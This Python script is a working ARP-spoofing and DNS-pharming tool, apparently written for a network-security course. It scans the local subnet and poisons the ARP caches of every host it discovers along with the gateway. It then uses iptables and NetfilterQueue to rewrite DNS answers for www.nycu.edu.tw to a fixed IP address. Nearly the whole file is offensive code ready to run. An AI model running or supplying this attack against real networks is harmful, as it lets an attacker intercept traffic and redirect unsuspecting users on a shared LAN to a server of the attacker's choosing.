#!/usr/bin/env python3

import scapy.all as scapy
#from scapy.all import *
import time
import sys
import argparse
import socket, struct
import subprocess
import os
import threading
from netfilterqueue import NetfilterQueue   # for putting the packet into queue than modified it
import netifaces

def get_mac(ip):
    for a in range(10):
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list, unanswer = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)
        if len(answered_list) == 0:
            print("no find")
            continue
        else:
            return answered_list[0][1].hwsrc
    print("Can't find mac address")
    os.exit(1)

    # return 'b4:6b:fc:1d:e8:9f' # error here, use this for temp

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
  
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

def translate_to_slash(netmask):
    temp = netmask.rsplit('.')
    number = 0
    for i in range(4):
        number = number << 8
        number += int(temp[i])
    slash = 0
    for i in range(32):
        if number % 2 == 1:
            slash = i
            break
        number = number >> 1
    return 32 - slash


# def get_local_info():
#     interfaces = netifaces.ifaddresses('enp0s3')
#     # dictionary
#     normal_internet = interfaces[netifaces.AF_INET][0]
#     address = normal_internet['addr']
#     netmask = normal_internet['netmask']
#     broadcast = normal_internet['broadcast']
#     # slash = IPAddress(netmask).netmask_bits()
#     slash = translate_to_slash(netmask)
#     # obtain gateway
#     gws = netifaces.gateways()
#     gw = gws['default'][netifaces.AF_INET][0]
    
#     return address, netmask, broadcast, str(slash), gw

def get_local_info():
    
    interfaces = netifaces.interfaces()

    for interface_name in interfaces:
        interface = netifaces.ifaddresses(interface_name)
        try:
            # dictionary
            normal_internet = interface[netifaces.AF_INET][0]
            address = normal_internet['addr']
            netmask = normal_internet['netmask']
            broadcast = normal_internet['broadcast']
            # slash = IPAddress(netmask).netmask_bits()
            slash = translate_to_slash(netmask)
            # obtain gateway
            gws = netifaces.gateways()
            gw = gws['default'][netifaces.AF_INET][0]
            return address, netmask, broadcast, str(slash), gw
        except KeyError:
            print("this interface: ", interface_name, " isn't feasible")
            continue

def getDevice(ip, gw):
    request = scapy.ARP()
    request.pdst = ip
    broadcast = scapy.Ether()

    broadcast.dst = 'ff:ff:ff:ff:ff:ff'

    request_broadcast = broadcast / request
    clients = scapy.srp(request_broadcast, timeout=10, verbose=1)[0]

    result = []

    print('Available devices')
    print('----------------------------')
    print('IP         MAC')
    print('----------------------------')
    for element in clients:
        if element[1].psrc != gw:
            print(element[1].psrc + "   " + element[1].hwsrc)
            result_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            result.append(result_dict)
    print(' ')

    return result

# Modifying the DNSRR packet
def pharming(pkt):
    # Change the queued packet to scapy packet payload
    data=scapy.IP(pkt.get_payload())
    # If the packet is really the DNS query response packet
    if data.haslayer(scapy.DNSRR):
        # If the query website is the target website
        # print(str(data[scapy.DNSQR].qname))
        if "www.nycu.edu.tw" in str(data[scapy.DNSQR].qname):
            # Change the query IP to target server IP
            ans=scapy.DNSRR(rrname=data[scapy.DNSQR].qname, rdata="140.113.207.246")
            data[scapy.DNS].an=ans    # Save the modified IP into Scapy packet
            data[scapy.DNS].ancount=1 # Query answer count = 1

            # Delete the check field from IP and UDP header (DNS query use UDP)
            del data[scapy.IP].len
            del data[scapy.IP].chksum
            del data[scapy.UDP].len
            del data[scapy.UDP].chksum

            pkt.set_payload(bytes(data))    #Turn the modified scapy packet payload back to original packet type
    # Accept the packet
    pkt.accept()

# Sniff() starter
def startPharming():
    # Build up the queue number 0
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    print("Start pharming...")
    # Modify the DNS response packet by "pharming" function
    queue=NetfilterQueue()
    try:
        # Bind the queue number 0 with "pharming" function
        queue.bind(0,pharming)
        # Start queuing the packets
        queue.run()
    except KeyboardInterrupt:
        # Flush the queue number 0
        os.system("iptables --flush")

if __name__ == '__main__':

    address, netmask, broadcast, slash, gw = get_local_info()

    # print(get_mac('192.168.99.100')) 
    result = getDevice(address + '/' + slash, gw)

    # target_ip = "172.20.10.11" # Enter your target IP
    # gateway_ip = "192.168.99.1" # Enter your gateway's IP
    gateway_ip = gw


    t = threading.Thread(target = startPharming)
    t.setDaemon(True)
    t.start()

    try:
        sent_packets_count = 0
        while True:
            for index in result:
                if index['ip'] != gw:
                    target_ip = index['ip']
                    target_mac = index['mac']
                    spoof(target_ip, gateway_ip, target_mac) # cheat on victim to know I am gateway
                    spoof(gateway_ip, target_ip, target_mac) # cheat on switch to know I am target
                    sent_packets_count = sent_packets_count + 2
                    # print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
                    # time.sleep(0.5) # Waits for two seconds
    
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        # restore(gateway_ip, target_ip)
        # restore(target_ip, gateway_ip)
        print("[-] Arp Spoof Stopped")
        os.system("iptables --flush")
        t.join()
        print("stop thread")